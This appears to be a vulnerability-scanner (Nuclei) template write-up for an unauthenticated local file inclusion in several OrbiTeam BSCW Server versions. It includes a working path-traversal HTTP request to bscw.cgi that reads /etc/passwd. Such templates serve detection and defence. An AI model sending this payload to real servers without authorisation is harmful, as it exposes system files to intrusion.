# Nuclei Template: OrbiTeam BSCW Server - Local File Inclusion
**Template ID:** orbiteam-bscw-server-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`orbiteam-bscw-server-lfi.yaml`)

## Vulnerability Information & PoC

## Description
OrbiTeam BSCW Server versions 5.0.x, 5.1.x, 5.2.4 and below, 7.3.x and below, and 7.4.3 and below are vulnerable to unauthenticated local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd
```

## References
- https://packetstormsecurity.com/files/165156/OrbiTeam-BSCW-Server-XSS-LFI-User-Enumeration.html
